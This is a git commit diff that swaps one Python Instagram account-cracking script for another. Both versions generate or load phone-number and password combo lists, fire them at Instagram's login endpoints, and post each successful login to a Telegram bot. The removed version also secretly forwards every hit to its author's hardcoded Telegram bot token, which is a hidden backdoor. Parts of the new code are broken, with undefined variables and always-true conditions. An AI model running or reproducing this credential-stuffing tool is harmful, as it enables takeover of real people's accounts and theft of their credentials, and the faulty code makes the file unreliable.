d21429d0ca2e97f61494ffabb6d3e22305b6dd38
Ahmad <80915733+kakacoder21@users.noreply.github.com>
2021-08-16 01:23:33 +0300

    nbs

--- nbs.py
+++ nbs.py
@@ -1,254 +1,164 @@
-
-import requests
-import json
-import time
+#Cracked
+import os , sys
+from time import sleep
 import random
-import sys
-import os
 import requests
+from uuid import uuid4
 
 
-def chk():
-  uuid = str(os.geteuid()) + str(os.getlogin())
-  id = "-".join(uuid)
-  print("\x1b[37;1mID XOT: "+id)
-  try:
-    GUBXO = requests.get("https://textuploader.com/ta924").text
-    if id in GUBXO:
-      print("\033[92mYOUR ID IS ACTIVE.....")
-      msg = str(os.geteuid())
-      time.sleep(1)
-      pass
-    else:
-      print("\x1b[91mIDT ACTIVE NIA LA TELEGRAM NAMA BNERA....")
-      time.sleep(1)
-      sys.exit()
-  except:
+def close():
+    input('')
     sys.exit()
-    if name == '__main__':
-    	print(logo)
-    	chk()
-chk()
+l = '\033[91m'
+h = 0
+b = 0
+s = 0
+block = 0
 
-user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
-user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55'
-user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Vivaldi/4.1'
-user_agent = 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
-user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
-
-# python3 /sdcard/tool.kurdish/test.py
-id_my = '1371291947'
-token_my = '1945290197:AAHCyD14FYglf-t1abSJp3CEb_RlZZCFD0o'
-os.system('rm -rf Cart.txt')
-num = '''\033[32m 770 + 771 + 772 +773 +774 + 750 + 751 +752 +753 +754 + 780 + 781 + 782 + 783 + 784
-'''
-url="https://www.instagram.com/accounts/login/ajax/"
-headers={
-    'accept': '*/*',
-    'accept-encoding': 'gzip, deflate, br',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-length': '282',
-    'content-type': 'application/x-www-form-urlencoded',
-    'cookie': 'csrftoken=Z23MdmsOaneIBPSuevdvZ029aMVWl6vw; mid=YJHiTgALAAGMKBeVSlMKDoCAq3cC; ig_did=B77ECEEB-5C81-43CC-AA42-7108227B197C; ig_nrcb=1',
-    'origin': 'https://www.instagram.com',
-    'referer': 'https://www.instagram.com/',
-    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
-    'x-csrftoken': 'Z23MdmsOaneIBPSuevdvZ029aMVWl6vw',
-    'x-ig-app-id': '936619743392459',
-    'x-ig-www-claim': '0',
-    'x-instagram-ajax': '05b80a16b1ac',
-    'x-requested-with': 'XMLHttpRequest',
-}
-banek='''\x1b[1;97m
- [\033[32m1\x1b[1;97m] - Crack RAQAM+PASS
- [\033[32m2\x1b[1;97m] - Crack RAQAM+RAQAM
- [\033[32m3\x1b[1;97m] - Crack GMAIL+RAQAM
- [\033[32m4\x1b[1;97m] - Crack EMAIL+PASS
- [\033[32m0\x1b[1;97m] - Exit Tool
-'''
-logo = '''\x1b[1;92m
-
-
-_________ _        _______ _________ _______  _______  _______  _______  _______ 
-\__   __/( (    /|(  ____ \\__   __/(  ___  )(  ____ \(  ____ )(  ___  )(       )
-   ) (   |  \  ( || (    \/   ) (   | (   ) || (    \/| (    )|| (   ) || () () |
-   | |   |   \ | || (_____    | |   | (___) || |      | (____)|| (___) || || || |
-   | |   | (\ \) |(_____  )   | |   |  ___  || | ____ |     __)|  ___  || |(_)| |
-   | |   | | \   |      ) |   | |   | (   ) || | \_  )| (\ (   | (   ) || |   | |
-___) (___| )  \  |/\____) |   | |   | )   ( || (___) || ) \ \__| )   ( || )   ( |
-\_______/|/    )_)\_______)   )_(   |/     \|(_______)|/   \__/|/     \||/     \|
-                                                                                 
-
-                                                                          
-                                                                          
-
- 
- Telegram: i4m_REX
- Channal : BESTxHACKER
- ---------------------------------------------------------------------
- 
- '''
-logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
-
-def reba(FARA):
-	for e in FARA + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.010)
-
-def menu():
-	os.system('clear')
-	print(logo)
-	print(logo2)
-	print(banek)
-	aco()
-
-def aco():
-	reb = input('---> ')
-	print(num)
-	
-	if reb=='1':
-		sfr = input(' \x1b[1;97mchand bet:\033[32m ')
-		op=open('Cart.txt','w')
-		for x in range(10000):
-			f = "1234567890"
-			x1 = random.choice(f)
-			x2 = random.choice(f)
-			x3 = random.choice(f)
-			x4 = random.choice(f)
-			x5 = random.choice(f)
-			x6 = random.choice(f)
-			x7 = random.choice(f)
-			user =x1+x2+x3+x4+x5+x6+x7
-			kk = '+964'+sfr
-			op.write(kk+user+':'+user+'\n')
-		op.close()
-		combo = ('Cart.txt')
-	
-	elif reb=='2':
-		sfr = input(' \x1b[1;97mchand bet:\033[32m ')
-		op=open('Cart.txt','w')
-		for x in range(10000):
-			f = "1234567890"
-			x1 = random.choice(f)
-			x2 = random.choice(f)
-			x3 = random.choice(f)
-			x4 = random.choice(f)
-			x5 = random.choice(f)
-			x6 = random.choice(f)
-			x7 = random.choice(f)
-			user =x1+x2+x3+x4+x5+x6+x7
-			kk = '+964'+sfr
-			op.write(kk+user+':'+'0'+sfr+user+'\n')
-		op.close()
-		combo = ('Cart.txt')
-	
-	elif reb=='3':
-		print(' \033[32mname bnosa')
-		sfr = input(' \x1b[1;97mname: \033[32m')
-		op=open('Cart.txt','w')
-		for x in range(10000):
-			f = "1234567890"
-			x1 = random.choice(f)
-			x2 = random.choice(f)
-			x3 = random.choice(f)
-			x4 = random.choice(f)
-			x5 = random.choice(f)
-			x6 = random.choice(f)
-			x7 = random.choice(f)
-			kk =sfr+x1+x2+x3+'@gmail.com'
-			op.write(kk+':'+sfr+x1+x2+x3+'\n')
-		op.close()
-		combo = ('Cart.txt')
-	elif reb=='4':
-		print(logo)
-		print(logo2)
-		fg =input(' sdcard Cart: ')
-		combo=fg
-	elif reb=='0':
-		print('[-] Exit tool')
-		sys.exit()
-	else:
-		sys.exit()
-	
-	crack()
-
-
-def crack():
-	r0=0
-	r1=0
-	r2=0
-	r3=0
-	r4=0
-	for x in open('Cart.txt','r').read().splitlines():
-		user = x.split(":")[0]
-		pas = x.split(":")[1]
-		
-		data={'username': user,'enc_password': "#PWD_INSTAGRAM_BROWSER:0:&:"+pas,}
-		reba=requests.post(url, data=data, headers=headers).text
-		if ('"authenticated":true') in reba:
-			r1+=1
-			os.system('clear')
-			
-			print(logo)
-			print(logo2)
-			print('\033[32m Hacked : '+str(r1))
-			print('\033[93m Checkpoint : '+str(r2))
-			print('\033[31m Bad : '+str(r3))
-			print(logo2)
-			sender =user+' : '+pas
-			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
-			response = requests.get(send_telegram)
-			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
-			responsek = requests.get(send_my)
-			r2+=1
-			os.system('clear')
-			
-			print(logo)
-			print(logo2)
-			print('\033[32m Hacked : '+str(r1))
-			print('\033[93m CP : '+str(r2))
-			print('\033[31m Bad : '+str(r3))
-			print(logo2)
-		
-		
-			r4+=1
-			os.system('clear')
-		
-			print(logo)
-			print(logo2)
-			print('\033[32m Hacked : '+str(r1))
-			print('\033[93m CP : '+str(r2))
-			print('\033[31m Bad : '+str(r3))
-			print(logo2)
-			print(reba)
-			time.sleep(50.0)
-			r0=0
-			
-			
-		else:
-			r3+=1
-			os.system('clear')
-			
-			print(logo)
-			print(logo2)
-			print('\033[32m Hacked : '+str(r1))
-			print('\033[93m Checkpoint : '+str(r2))
-			print('\033[31m Bad : '+str(r3))
-			print(logo2)
-
-
-
-
+logo = l+"""
+\033[96;1m
+                                              
+III N   N  SSS  TTTTTT  AA  
+ I  NN  N S       TT   A  A 
+ I  N N N  SSS    TT   AAAA 
+ I  N  NN     S   TT   A  A 
+III N   N SSSS    TT   A  A 
+                            
+Hacked By Profisor                             
+                                             
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+\033[36;1mCODE BY: IM PROFISOR
+\033[34;1mCHANNEL: @rekarhack
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+"""
+tele = input("\033[33;1mSTART AKAIT Y/N: ")
 os.system('clear')
+if "Y" in tele:
+    id = input("\033[33;1mID TELEGRAM: ")
+    bot = input("\033[33;1mTOKEN BOT: ")
+elif "y" in tele:
+    id = input("ID TELEGRAM: ")
+    bot = input("TOKEN BOT: ")
+    
 print(logo)
-print(logo2)
-id_tg =input(' ID Telegram: ')
-token_bot=input(' Token Bot: ')
-time.sleep(0.5)
-menu()
+xoshnaw = input("""| 1 | = NUMBER CHECKER
+| 2 | = COMBO CHECKER
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n
+HALLBZHERA DLM: """)
+if xoshnaw == "1":
+   
+    nmuna = '0123456789'
+    os.system('clear')
+    print(logo)
+    print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+
+    while True:
+        fuck = str(''.join((random.choice(nmuna) for i in range(8))))
+        user = '+96477' + fuck
+        pasw = '077' + fuck
+        #print(f"\n{user} \n {pasw}")
+        req = requests.session()
+        log_head = {
+        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+        'Accept': "*/*",
+        'Cookie': 'missing',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-Connection-Type': 'WIFI',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'i.instagram.com'}
+        uid = str(uuid4())
+        log_data = {
+            'uuid': uid,
+            'password': pasw,
+            'username': user,
+            'device_id': uid,
+            'from_reg': 'false',
+            '_csrftoken': 'missing',
+            'login_attempt_countn': '0'}
+        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
+        #print(r.text)
+        if "logged_in_user" in r.text:
+            if "Y" or "y" in tele:
+                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD: {user}:{pasw}")
+            h += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
+            b += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        elif 'challenge_required' or 'two' in log.text:
+            s += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        elif 'Please wait a few minutes' in log.text:
+            block += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        elif 'GOOD session' in log.text:
+            b += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        else:
+            b+=1    
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+
+elif xoshnaw =="2":
+    os.system('clear')
+    print(logo)
+    co = input("\033[1;91mCOMBO: ")
+    if '.txt' in co:
+        pass
+    else:
+        co  = co + '.txt'
+   
+    os.system('clear')
+    print(logo)
+    print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+    acc = open(co,"r").read().splitlines()
+    for combo in acc:
+        user = combo.split(":")[0]
+        pasw = combo.split(":")[1]
+        req = requests.session()
+        log_head = {
+        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+        'Accept': "*/*",
+        'Cookie': 'missing',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US',
+        'X-IG-Capabilities': '3brTvw==',
+        'X-IG-Connection-Type': 'WIFI',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'Host': 'i.instagram.com'}
+        uid = str(uuid4())
+        log_data = {
+            'uuid': uid,
+            'password': pasw,
+            'username': user,
+            'device_id': uid,
+            'from_reg': 'false',
+            '_csrftoken': 'missing',
+            'login_attempt_countn': '0'}
+        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
+        #print(r.text)
+        if "logged_in_user" in r.text:
+            if "Y" or "y" in tele:
+                  t = session.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=GOOD: {user}:{pasw}")
+         
+            h += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
+            b += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        elif 'challenge_required' in log.text:
+            s += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        elif 'Please wait a few minutes' in log.text:
+            block += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        elif 'GOOD session' in log.text:
+            b += 1
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+        else:
+            b+=1    
+            print(f"\r \033[32mGOOD: {h} \033[31;1mBAD: {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
+
+    
+
